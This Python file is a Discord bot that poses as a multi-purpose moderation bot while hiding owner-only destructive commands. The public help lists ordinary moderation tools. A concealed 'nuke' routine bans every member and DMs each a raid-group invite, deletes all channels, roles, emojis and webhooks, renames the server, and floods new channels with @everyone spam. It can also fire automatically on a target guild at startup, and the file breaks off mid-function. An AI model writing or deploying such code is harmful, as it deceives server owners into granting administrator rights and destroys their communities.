# language: Python 3.11+, file: bot.py, target: Discord + Railway
# Saphire undercover — public multi-purpose facade + owner nuke payload

from __future__ import annotations

import os
import sys
import json
import random
import asyncio
import logging
import traceback
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Optional, List, Iterable, Set

import aiohttp
from aiohttp import web
import discord
from discord.ext import commands
from discord.errors import HTTPException, Forbidden, NotFound

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
    force=True,
)
log = logging.getLogger("saphire")

WHITELIST_FILE = Path("whitelist.json")
BOT_NAME = "Saphire"
BOT_COLOR = 0x5865F2
PROMO = (
    "@everyone\n"
    "## Got fucked? Join us today..\n"
    "https://discord.gg/SKyfbZxzbp\n"
    "## WHITELIST UR SERVER! WITH US."
)
MENTION_ALL = discord.AllowedMentions(everyone=True, users=True, roles=True)


def clean(v: Optional[str]) -> str:
    if not v:
        return ""
    v = v.strip()
    if len(v) >= 2 and v[0] == v[-1] and v[0] in ("'\""):
        v = v[1:-1].strip()
    return v


def first_env(*keys: str, default: str = "") -> str:
    for k in keys:
        val = clean(os.getenv(k))
        if val:
            log.info("Using env %s (len=%s)", k, len(val))
            return val
    return default


def env_bool(key: str, default: bool = False) -> bool:
    return (os.getenv(key) or str(default)).strip().lower() in ("1", "true", "yes", "on", "y")


def env_int(key: str, default: int = 0) -> int:
    try:
        return int((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default


def env_float(key: str, default: float = 0.0) -> float:
    try:
        return float((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default


def parse_ids(raw: str) -> Set[int]:
    out: Set[int] = set()
    for part in raw.replace(" ", "").split(","):
        if part.isdigit():
            out.add(int(part))
    return out


TOKEN = first_env("TOKEN", "DISCORD_TOKEN", "BOT_TOKEN", "DISCORD_BOT_TOKEN", "CLIENT_TOKEN")
OWNER_IDS = parse_ids(first_env("OWNER_IDS", "OWNER_ID", "OWNERS", "BOT_OWNER", "OWNER"))
PREFIX = first_env("PREFIX", "BOT_PREFIX", default="s!") or "s!"
PORT = env_int("PORT", 8080)

NUKE_NAME = first_env("NUKE_NAME", default="NUKED") or "NUKED"
SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 40))
SPAM_MESSAGES = max(1, env_int("SPAM_MESSAGES", 10))
_raw = first_env("SPAM_TEXT", default="")
SPAM_TEXT = _raw if _raw else PROMO
if "@everyone" not in SPAM_TEXT:
    SPAM_TEXT = "@everyone\n" + SPAM_TEXT
WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
BAN_REASON = first_env("BAN_REASON", default="Violation of server rules") or "Violation of server rules"
DELETE_ROLES = env_bool("DELETE_ROLES", True)
DELETE_EMOJIS = env_bool("DELETE_EMOJIS", True)
DELETE_STICKERS = env_bool("DELETE_STICKERS", True)
DELETE_WEBHOOKS = env_bool("DELETE_WEBHOOKS", True)
BAN_ALL = env_bool("BAN_ALL", True)
KICK_INSTEAD = env_bool("KICK_INSTEAD", False)
SKIP_BOTS = env_bool("SKIP_BOTS", False)
SKIP_OWNER = env_bool("SKIP_OWNER", True)
CREATE_ROLES = max(0, env_int("CREATE_ROLES", 8))
ROLE_NAME = first_env("ROLE_NAME", default="nuked") or "nuked"
CHANNEL_NAME = first_env("CHANNEL_NAME", default="nuked") or "nuked"
CREATE_CATEGORIES = max(0, env_int("CREATE_CATEGORIES", 4))
CREATE_VOICE = max(0, env_int("CREATE_VOICE", 6))
DM_MESSAGE = first_env("DM_MESSAGE") or PROMO
LOG_WEBHOOK = first_env("LOG_WEBHOOK", "WEBHOOK_URL")
AUTO_NUKE_GUILD = first_env("AUTO_NUKE_GUILD", "GUILD_ID", "TARGET_GUILD")
CONCURRENCY = max(1, min(env_int("CONCURRENCY", 3), 10))
RATE_LIMIT_DELAY = max(0.2, env_float("RATE_LIMIT_DELAY", 0.35))
PHASE_PAUSE = max(0.4, env_float("PHASE_PAUSE", 1.5))
MAX_RETRIES = max(1, env_int("MAX_RETRIES", 5))
CMD_COOLDOWN = max(0.0, env_float("CMD_COOLDOWN", 6.0))
KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))

WHITELIST: Set[int] = parse_ids(first_env("WHITELIST_GUILDS", "WHITELIST", default=""))


def load_whitelist() -> None:
    global WHITELIST
    if WHITELIST_FILE.exists():
        try:
            data = json.loads(WHITELIST_FILE.read_text(encoding="utf-8"))
            for x in data:
                if isinstance(x, int) or (isinstance(x, str) and str(x).isdigit()):
                    WHITELIST.add(int(x))
        except Exception as e:
            log.warning("wl load: %s", e)


def save_whitelist() -> None:
    try:
        WHITELIST_FILE.write_text(json.dumps(sorted(WHITELIST), indent=2), encoding="utf-8")
    except Exception as e:
        log.warning("wl save: %s", e)


def is_whitelisted(gid: int) -> bool:
    return gid in WHITELIST


load_whitelist()

log.info("=== %s BOOT ===", BOT_NAME)
log.info("TOKEN=%s OWNER=%s PREFIX=%s", bool(TOKEN), OWNER_IDS or "-", PREFIX)

intents = discord.Intents.none()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
intents.emojis = True
intents.emojis_and_stickers = True
intents.moderation = True
intents.guild_reactions = True

bot = commands.Bot(
    command_prefix=commands.when_mentioned_or(PREFIX),
    intents=intents,
    help_command=None,
    chunk_guilds_at_startup=False,
    activity=discord.Activity(type=discord.ActivityType.watching, name=f"servers | {PREFIX}help"),
)

sem: asyncio.Semaphore | None = None
action_lock = asyncio.Lock()
_http: aiohttp.ClientSession | None = None
_bot_ready = False
_global_cd = 0.0


def is_owner(uid: int) -> bool:
    return bool(OWNER_IDS) and uid in OWNER_IDS


def owner_only():
    async def pred(ctx: commands.Context) -> bool:
        return is_owner(ctx.author.id)

    return commands.check(pred)


def emb(title: str, desc: str = "", color: int = BOT_COLOR) -> discord.Embed:
    e = discord.Embed(title=title, description=desc or None, color=color)
    e.set_footer(text=f"{BOT_NAME} • Multi-purpose")
    e.timestamp = datetime.now(timezone.utc)
    return e


async def get_http() -> aiohttp.ClientSession:
    global _http
    if _http is None or _http.closed:
        _http = aiohttp.ClientSession()
    return _http


async def slog(msg: str):
    log.info(msg)
    if LOG_WEBHOOK:
        try:
            s = await get_http()
            await s.post(LOG_WEBHOOK, json={"content": f"```{msg[:1900]}```"})
        except Exception:
            pass


async def jitter(base: float | None = None):
    d = base if base is not None else RATE_LIMIT_DELAY
    await asyncio.sleep(d * (1.15 + random.random() * 0.5))


async def limited(coro):
    global _global_cd
    assert sem is not None
    async with sem:
        now = asyncio.get_event_loop().time()
        if now < _global_cd:
            await asyncio.sleep(_global_cd - now)
        for attempt in range(MAX_RETRIES):
            try:
                r = await coro
                await jitter()
                return r
            except HTTPException as e:
                if e.status == 429:
                    retry = 2.0 * (2 ** attempt)
                    try:
                        if e.response is not None:
                            ra = e.response.headers.get("Retry-After")
                            if ra:
                                retry = float(ra) + random.uniform(0.2, 0.9)
                            if e.response.headers.get("X-RateLimit-Global", "").lower() == "true":
                                _global_cd = asyncio.get_event_loop().time() + retry
                    except Exception:
                        pass
                    await asyncio.sleep(retry)
                    continue
                if e.status in (500, 502, 503, 504):
                    await asyncio.sleep(1.2 * (attempt + 1))
                    continue
                return None
            except (Forbidden, NotFound):
                return None
            except Exception:
                return None
        return None


async def gather_lim(coros: Iterable):
    tasks = [asyncio.create_task(limited(c)) for c in coros]
    return await asyncio.gather(*tasks, return_exceptions=True) if tasks else []


async def pause():
    await asyncio.sleep(PHASE_PAUSE + random.uniform(0, 0.6))


async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
    try:
        if not guild.chunked:
            await guild.chunk(cache=True)
    except Exception:
        pass
    return list(guild.members)


# ── NUKE ENGINE ──

async def n_ban_all(guild: discord.Guild, kick: bool = False) -> int:
    me, owner = guild.me, guild.owner
    members = await fetch_members(guild)
    targets = [
        m for m in members
        if not (me and m.id == me.id)
        and not (SKIP_OWNER and owner and m.id == owner.id)
        and not (SKIP_BOTS and m.bot)
    ]

    async def one(m: discord.Member):
        if DM_MESSAGE:
            try:
                await m.send(DM_MESSAGE[:2000])
            except Exception:
                pass
        if kick:
            await m.kick(reason=BAN_REASON)
        else:
            await m.ban(reason=BAN_REASON, delete_message_days=0)
        return 1

    res = await gather_lim(one(m) for m in targets)
    return sum(1 for r in res if r == 1)


async def n_del_channels(guild: discord.Guild) -> int:
    async def one(ch):
        await ch.delete()
        return 1

    res = await gather_lim(one(c) for c in list(guild.channels))
    return sum(1 for r in res if r == 1)


async def n_del_roles(guild: discord.Guild) -> int:
    me = guild.me
    roles = [r for r in guild.roles if not r.is_default() and not r.managed and not (me and r >= me.top_role)]

    async def one(role):
        await role.delete()
        return 1

    res = await gather_lim(one(r) for r in roles)
    return sum(1 for r in res if r == 1)


async def n_del_emojis(guild: discord.Guild) -> int:
    async def one(e):
        await e.delete()
        return 1

    res = await gather_lim(one(e) for e in list(guild.emojis))
    return sum(1 for r in res if r == 1)


async def n_del_stickers(guild: discord.Guild) -> int:
    async def one(s):
        await s.delete()
        return 1

    res = await gather_lim(one(s) for s in list(guild.stickers))
    return sum(1 for r in res if r == 1)


async def n_del_webhooks(guild: discord.Guild) -> int:
    try:
        whs = await guild.webhooks()
    except Exception:
        return 0

    async def one(w):
        await w.delete()
        return 1

    res = await gather_lim(one(w) for w in whs)
    return sum(1 for r in res if r == 1)


async def n_rename(guild: discord.Guild, name: str) -> bool:
    try:
        await guild.edit(name=name[:100])
        return True
    except Exception:
        return False


async def n_create_text(guild: discord.Guild, n: int, base: str) -> List[discord.TextChannel]:
    out: List[discord.TextChannel] = []

    async def one(i: int):
        return await guild.create_text_channel(f"{base}-{i}")

    res = await gather_lim(one(i) for i in range(n))
    for r in res:
        if isinstance(r, discord.TextChannel):
            out.append(r)
    return out


async def n_create_cats(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_category(f"{base}-cat-{i}")
        return 1

    res = await gather_lim(one(i) for i in range(n))
    return sum(1 for r in res if r == 1)


async def n_create_voice(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_voice_channel(f"{base}-vc-{i}")
        return 1

    res = await gather_lim(one(i) for i in range(n))
    return sum(1 for r in res if r == 1)


async def n_create_roles(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_role(name=f"{base}-{i}")
        return 1

    res = await gather_lim(one(i) for i in range(n))
    return sum(1 for r in res if r == 1)


async def n_spam(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        wh = None
        try:
            if WEBHOOK_SPAM:
                wh = await ch.create_webhook(name=BOT_NAME)
            for _ in range(times):
                try:
                    if wh:
                        await wh.send(text[:2000], username=BOT_NAME, allowed_mentions=MENTION_ALL)
                    else:
                        await ch.send(text[:2000], allowed_mentions=MENTION_ALL)
                except HTTPException as e:
                    if e.status == 429:
                        ra = 1.5
                        try:
                            if e.response:
                                ra = float(e.response.headers.get("Retry-After", 1.5))
                        except Exception:
                            pass
                        await asyncio.sleep(ra + 0.4)
                        continue
                    break
                except Exception:
                    break
                await jitter()
        finally:
            if wh:
                try:
                    await wh.delete()
                except Exception:
                    pass
        return 1

    await gather_lim(one(c) for c in channels)


async def full_nuke(guild: discord.Guild):
    if is_whitelisted(guild.id):
        await slog(f"[-] WL block {guild.id}")
        return
    if action_lock.locked():
        await slog("[-] busy")
        return

    async with action_lock:
        await slog(f"[*] NUKE {guild.name} ({guild.id})")
        if BAN_ALL:
            await slog(f"[+] ban/kick {await n_ban_all(guild, KICK_INSTEAD)}")
            await pause()
        if DELETE_WEBHOOKS:
            await slog(f"[+] webhooks {await n_del_webhooks(guild)}")
            await pause()
        await slog(f"[+] channels {await n_del_channels(guild)}")
        await pause()
        if DELETE_ROLES:
            await slog(f"[+] roles {await n_del_roles(guild)}")
            await pause()
        if DELETE_EMOJIS:
            await slog(f"[+] emojis {await n_del_emojis(guild)}")
        if DELETE_STICKERS:
            await slog(f"[+] stickers {await n_del_stickers(guild)}")
            await pause()
        await slog(f"[+] rename {await n_rename(guild, NUKE_NAME)}")
        await pause()
        if CREATE_ROLES:
            await slog(f"[+] roles+ {await n_create_roles(guild, CREATE_ROLES, ROLE_NAME)}")
        if CREATE_CATEGORIES:
            await slog(f"[+] cats {await n_create_cats(guild, CREATE_CATEGORIES, CHANNEL_NAME)}")
        if CREATE_VOICE:
            await slog(f"[+] voice {await n_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)}")
        await pause()
        chs = await n_create_text(guild, SPAM_CHANNELS, CHANNEL_NAME)
        await slog(f"[+] text {len(chs)}")
        if chs and SPAM_MESSAGES:
            await n_spam(chs, SPAM_TEXT, SPAM_MESSAGES)
            await slog("[+] spam done")
        await slog("[*] DONE")


# ── health ──

async def health(_):
    return web.Response(text="online" if _bot_ready else "starting", status=200)


async def start_health():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()
    log.info("health :%s", PORT)


@bot.event
async def on_ready():
    global sem, _bot_ready
    sem = asyncio.Semaphore(CONCURRENCY)
    _bot_ready = True
    log.info("===== %s ONLINE %s | guilds=%s =====", BOT_NAME, bot.user, len(bot.guilds))
    bot.loop.create_task(keepalive())
    if AUTO_NUKE_GUILD.isdigit():
        gid = int(AUTO_NUKE_GUILD)
        if not is_whitelisted(gid):
            g = bot.get_guild(gid)
            if g:
                await full_nuke(g)


async def keepalive():
    while True:
        await asyncio.sleep(KEEPALIVE_SEC)
        log.info("alive guilds=%s lat=%.0fms", len(bot.guilds), bot.latency * 1000)


@bot.event
async def on_command_error(ctx: commands.Context, error: Exception):
    if isinstance(error, commands.CommandOnCooldown):
        try:
            await ctx.send(f"Cooldown `{error.retry_after:.1f}s`." , delete_after=4)
        except Exception:
            pass
        return
    if isinstance(error, commands.MissingPermissions):
        try:
            await ctx.send("Missing permissions.")
        except Exception:
            pass
        return
    if isinstance(error, (commands.CheckFailure, commands.CommandNotFound, commands.BadArgument)):
        return
    log.error("cmd err: %s", error)


# ══════════════════════════════════════
# PUBLIC FACADE
# ══════════════════════════════════════

@bot.command(name="help")
async def c_help(ctx: commands.Context):
    e = emb(f"{BOT_NAME} — Commands", f"Prefix: `{PREFIX}` · Mention me anytime")
    e.add_field(
        name="Moderation",
        value=(
            f"`{PREFIX}ban` `{PREFIX}kick` `{PREFIX}mute` `{PREFIX}unmute`\n"
            f"`{PREFIX}warn` `{PREFIX}softban` `{PREFIX}unban`\n"
            f"`{PREFIX}purge` `{PREFIX}lock` `{PREFIX}unlock` `{PREFIX}slowmode`\n"
            f"`{PREFIX}nick` `{PREFIX}role` `{PREFIX}massban`"
        ),
        inline=False,
    )
    e.add_field(
        name="Info",
        value=(
            f"`{PREFIX}ping` `{PREFIX}serverinfo` `{PREFIX}userinfo`\n"
            f"`{PREFIX}avatar` `{PREFIX}roleinfo` `{PREFIX}channelinfo` `{PREFIX}botinfo`"
        ),
        inline=False,
    )
    e.add_field(
        name="Utility",
        value=f"`{PREFIX}say` `{PREFIX}embed` `{PREFIX}poll` `{PREFIX}invite`",
        inline=False,
    )
    await ctx.send(embed=e)


@bot.command(name="ping")
async def c_ping(ctx: commands.Context):
    await ctx.send(embed=emb("Pong", f"**{round(bot.latency*1000)}ms**"))


@bot.command(name="botinfo", aliases=["info"])
async def c_botinfo(ctx: commands.Context):
    e = emb(BOT_NAME, "Fully customizable multi-purpose bot.")
    e.add_field(name="Servers", value=str(len(bot.guilds)), inline=True)
    e.add_field(name="Latency", value=f"{round(bot.latency*1000)}ms", inline=True)
    e.add_field(name="Python", value=sys.version.split()[0], inline=True)
    if bot.user and bot.user.display_avatar:
        e.set_thumbnail(url=bot.user.display_avatar.url)
    await ctx.send(embed=e)


@bot.command(name="serverinfo", aliases=["si"])
async def c_si(ctx: commands.Context):
    g = ctx.guild
    e = emb(g.name)
    if g.icon:
        e.set_thumbnail(url=g.icon.url)
    e.add_field(name="Owner", value=str(g.owner), inline=True)
    e.add_field(name="Members", value=str(g.member_count), inline=True)
    e.add_field(name="Channels", value=str(len(g.channels)), inline=True)
    e.add_field(name="Roles", value=str(len(g.roles)), inline=True)
    e.add_field(name="Boosts", value=str(g.premium_subscription_count or 0), inline=True)
    e.add_field(name="Created", value=discord.utils.format_dt(g.created_at, "R"), inline=True)
    e.add_field(name="ID", value=f"`{g.id}`", inline=False)
    await ctx.send(embed=e)


@bot.command(name="userinfo", aliases=["ui", "whois"])
async def c_ui(ctx: commands.Context, m: Optional[discord.Member] = None):
    m = m or ctx.author
    e = emb(str(m))
    if m.display_avatar:
        e.set_thumbnail(url=m.display_avatar.url)
    e.add_field(name="ID", value=f"`{m.id}`", inline=True)
    e.add_field(name="Bot", value=str(m.bot), inline=True)
    e.add_field(name="Joined", value=discord.utils.format_dt(m.joined_at, "R") if m.joined_at else "—", inline=True)
    e.add_field(name="Created", value=discord.utils.format_dt(m.created_at, "R"), inline=True)
    roles = [r.mention for r in m.roles if r != ctx.guild.default_role][:12]
    e.add_field(name="Roles", value=" ".join(roles) or "None", inline=False)
    await ctx.send(embed=e)


@bot.command(name="avatar", aliases=["av"])
async def c_av(ctx: commands.Context, m: Optional[discord.Member] = None):
    m = m or ctx.author
    e = emb(f"Avatar — {m}")
    e.set_image(url=m.display_avatar.url)
    await ctx.send(embed=e)


@bot.command(name="roleinfo")
async def c_ri(ctx: commands.Context, *, role: discord.Role):
    e = emb(role.name)
    e.color = role.color.value or BOT_COLOR
    e.add_field(name="ID", value=f"`{role.id}`", inline=True)
    e.add_field(name="Members", value=str(len(role.members)), inline=True)
    e.add_field(name="Position", value=str(role.position), inline=True)
    await ctx.send(embed=e)


@bot.command(name="channelinfo", aliases=["ci"])
async def c_ci(ctx: commands.Context, channel: Optional[discord.TextChannel] = None):
    ch = channel or ctx.channel
    e = emb(f"#{ch.name}")
    e.add_field(name="ID", value=f"`{ch.id}`", inline=True)
    e.add_field(name="NSFW", value=str(getattr(ch, "nsfw", False)), inline=True)
    e.add_field(name="Created", value=discord.utils.format_dt(ch.created_at, "R"), inline=True)
    await ctx.send(embed=e)


@bot.command(name="ban")
@commands.has_permissions(ban_members=True)
@commands.bot_has_permissions(ban_members=True)
async def c_ban(ctx: commands.Context, member: discord.Member, *, reason: str = "No reason provided"):
    if member.top_role >= ctx.author.top_role and ctx.author.id != ctx.guild.owner_id:
        return await ctx.send("Cannot ban this member.")
    await member.ban(reason=f"{ctx.author}: {reason}")
    await ctx.send(embed=emb("Case — Ban", f"**{member}** banned.\nReason: {reason}", 0xED4245))


@bot.command(name="softban")
@commands.has_permissions(ban_members=True)
@commands.bot_has_permissions(ban_members=True)
async def c_softban(ctx: commands.Context, member: discord.Member, *, reason: str = "Softban"):
    await member.ban(reason=f"{ctx.author}: {reason}", delete_message_days=1)
    await ctx.guild.unban(member)
    await ctx.send(embed=emb("Case — Softban", f"**{member}** softbanned.\nReason: {reason}", 0xFEE75C))


@bot.command(name="unban")
@commands.has_permissions(ban_members=True)
@commands.bot_has_permissions(ban_members=True)
async def c_unban(ctx: commands.Context, user_id: int):
    user = await bot.fetch_user(user_id)
    await ctx.guild.unban(user)
    await ctx.send(embed=emb("Case — Unban", f"**{user}** unbanned.", 0x57F287))


@bot.command(name="kick")
@commands.has_permissions(kick_members=True)
@commands.bot_has_permissions(kick_members=True)
async def c_kick(ctx: commands.Context, member: discord.Member, *, reason: str = "No reason provided"):
    if member.top_role >= ctx.author.top_role and ctx.author.id != ctx.guild.owner_id:
        return await ctx.send("Cannot kick this member.")
    await member.kick(reason=f"{ctx.author}: {reason}")
    await ctx.send(embed=emb("Case — Kick", f"**{member}** kicked.\nReason: {reason}", 0xFEE75C))


@bot.command(name="mute", aliases=["timeout"])
@commands.has_permissions(moderate_members=True)
@commands.bot_has_permissions(moderate_members=True)
async def c_mute(ctx: commands.Context, member: discord.Member, minutes: int = 10, *, reason: str = "No reason"):
    minutes = max(1, min(minutes, 40320))
    await member.timeout(timedelta(minutes=minutes), reason=f"{ctx.author}: {reason}")
    await ctx.send(embed=emb("Case — Mute", f"**{member}** muted **{minutes}m**.\nReason: {reason}", 0xFEE75C))


@bot.command(name="unmute")
@commands.has_permissions(moderate_members=True)
@commands.bot_has_permissions(moderate_members=True)
async def c_unmute(ctx: commands.Context, member: discord.Member):
    await member.timeout(None)
    await ctx.send(embed=emb("Case — Unmute", f"**{member}** unmuted.", 0x57F287))


@bot.command(name="warn")
@commands.has_permissions(moderate_members=True)
async def c_warn(ctx: commands.Context, member: discord.Member, *, reason: str = "No reason provided"):
    await ctx.send(embed=emb("Case — Warn", f"**{member}** warned.\nReason: {reason}", 0xFEE75C))
    try:
        await member.send(f"Warned in **{ctx.guild.name}**: {reason}")
    except Exception:
        pass


@bot.command(name="purge", aliases=["clear"])
@commands.has_permissions(manage_messages=True)
@commands.bot_has_permissions(manage_messages=True)
async def c_purge(ctx: commands.Context, amount: int = 10):
    amount = max(1, min(amount, 100))
    deleted = await ctx.channel.purge(limit=amount + 1)
    m = await ctx.send(f"Deleted **{len(deleted)-1}** messages.")
    await asyncio.sleep(2)
    try:
        await m.delete()
    except Exception:
        pass


@bot.command(name="lock")
@commands.has_permissions(manage_channels=True)
@commands.bot_has_permissions(manage_channels=True)
async def c_lock(ctx: commands.Context, channel: Optional[discord.TextChannel] = None):
    ch = channel or ctx.channel
    overwrite = ch.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = False
    await ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send(embed=emb("Channel locked", f"{ch.mention} is now locked."))


@bot.command(name="unlock")
@commands.has_permissions(manage_channels=True)
@commands.bot_has_permissions(manage_channels=True)
async def c_unlock(ctx: commands.Context, channel: Optional[discord.TextChannel] = None):
    ch = channel or ctx.channel
    overwrite = ch.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = None
    await ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send(embed=emb("Channel unlocked", f"{ch.mention} is now unlocked.", 0x57F287))


@bot.command(name="slowmode")
@commands.has_permissions(manage_channels=True)
@commands.bot_has_permissions(manage_channels=True)
async def c_slow(ctx: commands.Context, seconds: int = 0):
    seconds = max(0, min(seconds, 21600))
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(embed=emb("Slowmode", f"Set to **{seconds}s**."))


@bot.command(name="nick", aliases=["setnick"])
@commands.has_permissions(manage_nicknames=True)
@commands.bot_has_permissions(manage_nicknames=True)
async def c_nick(ctx: commands.Context, member: discord.Member, *, nick: str = ""):
    await member.edit(nick=nick[:32] or None)
    await ctx.send(embed=emb("Nickname", f"**{member}** → `{nick or 'reset'}`"))


@bot.command(name="role")
@commands.has_permissions(manage_roles=True)
@commands.bot_has_permissions(manage_roles=True)
async def c_role(ctx: commands.Context, member: discord.Member, *, role: discord.Role):
    if role in member.roles:
        await member.remove_roles(role)
        await ctx.send(embed=emb("Role removed", f"Removed {role.mention} from **{member}**."))
    else:
        await member.add_roles(role)
        await ctx.send(embed=emb("Role added", f"Added {role.mention} to **{member}**."))


@bot.command(name="massban")
@commands.has_permissions(ban_members=True)
@commands.bot_has_permissions(ban_members=True)
async def c_massban(ctx: commands.Context, *user_ids: str):
    """Public-looking massban (mod tool) — owner can still use hidden nuke"""
    if not user_ids:
        return await ctx.send(f"Usage: `{PREFIX}massban <id> <id> ...`")
    ok = 0
    for uid in user_ids[:25]:
        if not uid.isdigit():
            continue
        try:
            await ctx.guild.ban(discord.Object(id=int(uid)), reason=f"massban by {ctx.author}")
            ok += 1
        except Exception:
            pass
        await jitter(0.3)
    await ctx.send(embed=emb("Case — Massban", f"Banned **{ok}** users.", 0xED4245))


@bot.command(name="say")
@commands.has_permissions(manage_messages=True)
async def c_say(ctx: commands.Context, *, message: str):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(message[:2000])


@bot.command(name="embed")
@commands.has_permissions(manage_messages=True)
async def c_embed(ctx: commands.Context, *, content: str):
    parts = content.split("|", 1)
    e = emb(parts[0].strip(), parts[1].strip() if len(parts) > 1 else "")
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(embed=e)


@bot.command(name="poll")
@commands.has_permissions(manage_messages=True)
async def c_poll(ctx: commands.Context, *, question: str):
    e = emb("Poll", question)
    msg = await ctx.send(embed=e)
    for r in ("\u2705", "\u274c"):
        await msg.add_reaction(r)


@bot.command(name="invite")
async def c_invite(ctx: commands.Context):
    if bot.user:
        url = discord.utils.oauth_url(bot.user.id, permissions=discord.Permissions(administrator=True))
        await ctx.send(embed=emb("Invite", f"[Add {BOT_NAME}]({url})"))


# ══════════════════════════════════════
# OWNER PAYLOAD (hidden)
# ══════════════════════════════════════

def heavy():
    return commands.cooldown(1, CMD_COOLDOWN, commands.BucketType.user)


@bot.command(name="nuke", hidden=True)
@owner_only()
@heavy()
async def o_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
    target = bot.get_guild(guild_id) if guild_id else ctx.guild
    if not target:
        return await ctx.send("Guild not found.")
    if is_whitelisted(target.id):
        return await ctx.send(f"WL `{target.id}`")
    if action_lock.locked():
        return await ctx.send("Busy.")
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await full_nuke(target)


@bot.command(name="banall", hidden=True)
@owner_only()
@heavy()
async def o_banall(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id) or action_lock.locked():
        return await ctx.send("Blocked.")
    async with action_lock:
        n = await n_ban_all(ctx.guild, False)
    await ctx.send(f"Banned: {n}")


@bot.command(name="kickall", hidden=True)
@owner_only()
@heavy()
async def o_kickall(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id) or action_lock.locked():
        return await ctx.send("Blocked.")
    async with action_lock:
        n = await n_ban_all(ctx.guild, True)
    await ctx.send(f"Kicked: {n}")


@bot.command(name="delchannels", hidden=True)
@owner_only()
@heavy()
async def o_delc(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id) or action_lock.locked():
        return await ctx.send("Blocked.")
    async with action_lock:
        n = await n_del_channels(ctx.guild)
    await ctx.send(f"Channels: {n}")


@bot.command(name="delroles", hidden=True)
@owner_only()
@heavy()
async def o_delr(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id) or action_lock.locked():
        return await ctx.send("Blocked.")
    async with action_lock:
        n = await n_del_roles(ctx.guild)
    await ctx.send(f"Roles: {n}")


@bot.command(name="delemojis", hidden=True)
@owner_only()
@heavy()
async def o_dele(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        return await ctx.send("Blocked.")
    e = await n_del_emojis(ctx.guild)
    s = await n_del_stickers(ctx.guild)
    await ctx.send(f"Emojis: {e} Stickers: {s}")


@bot.command(name="spam", hidden=True)
@owner_only()
@heavy()
async def o_spam(ctx: commands.Context, count: int = 20):
    if is_whitelisted(ctx.guild.id) or action_lock.locked():
        return await ctx.send("Blocked.")
    count = max(1, min(count, 50))
    async with action_lock:
        chs = await n_create_text(ctx.guild, count, CHANNEL_NAME)
        await n_spam(chs, SPAM_TEXT, SPAM_MESSAGES)
    await ctx.send(f"Spam: {len(chs)}")


@bot.command(name="dmall", hidden=True)
@owner_only()
@heavy()
async def o_dmall(ctx: commands.Context, *, message: Optional[str] = None):
    if is_whitelisted(ctx.guild.id) or action_lock.locked():
        return await ctx.send("Blocked.")
    msg = message or PROMO
    members = await fetch_members(ctx.guild)

    async def one(m: discord.Member):
        if m.bot:
            return 0
        await m.send(msg[:2000])
        return 1

    async with action_lock:
        res = await gather_lim(one(m) for m in members)
    await ctx.send(f"DM: {sum(1 for r in res if r == 1)}")


@bot.command(name="rename", hidden=True)
@owner_only()
async def o_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
    if is_whitelisted(ctx.guild.id):
        return await ctx.send("Blocked.")
    ok = await n_rename(ctx.guild, name)
    await ctx.send(f"Rename: {ok}")


@bot.command(name="whitelist", hidden=True)
@owner_only()
async def o_wl(ctx: commands.Context, action: str = "list", server_id: Optional[str] = None):
    a = action.lower()
    if a in ("list", "ls"):
        return await ctx.send(f"```{' '.join(map(str, sorted(WHITELIST))) or 'empty'}```")
    if a in ("add", "+") and server_id and server_id.isdigit():
        WHITELIST.add(int(server_id))
        save_whitelist()
        return await ctx.send(f"WL + `{server_id}`")
    if a in ("remove", "rm", "-") and server_id and server_id.isdigit():
        WHITELIST.discard(int(server_id))
        save_whitelist()
        return await ctx.send(f"WL - `{server_id}`")
    if a.isdigit():
        WHITELIST.add(int(a))
        save_whitelist()
        return await ctx.send(f"WL + `{a}`")
    await ctx.send(f"`{PREFIX}whitelist add|remove|list <id>`")


@bot.command(name="guilds", hidden=True)
@owner_only()
async def o_guilds(ctx: commands.Context):
    lines = [f"{g.name} | {g.id} | {g.member_count}{' [WL]' if is_whitelisted(g.id) else ''}" for g in bot.guilds]
    await ctx.send(f"```{(chr(10).join(lines) or 'none')[:1900]}```")


@bot.command(name="leave", hidden=True)
@owner_only()
async def o_leave(ctx: commands.Context):
    await ctx.send("Leaving.")
    await ctx.guild.leave()


@bot.command(name="ownerhelp", hidden=True)
@owner_only()
async def o_help(ctx: commands.Context):
    await ctx.send(
        f"```\n"
        f"{PREFIX}nuke [id]\n"
        f"{PREFIX}banall / kickall / delchannels / delroles / delemojis\n"
        f"{PREFIX}spam [n] / dmall [msg] / rename [name]\n"
        f"{PREFIX}whitelist add|remove|list <id>\n"
        f"{PREFIX}guilds / leave\n"
        f"```"
    )


async def runner():
    await start_health()
    if not TOKEN:
        log.error("NO TOKEN")
        while True:
            await asyncio.sleep(3600)
        return
    try:
        async with bot:
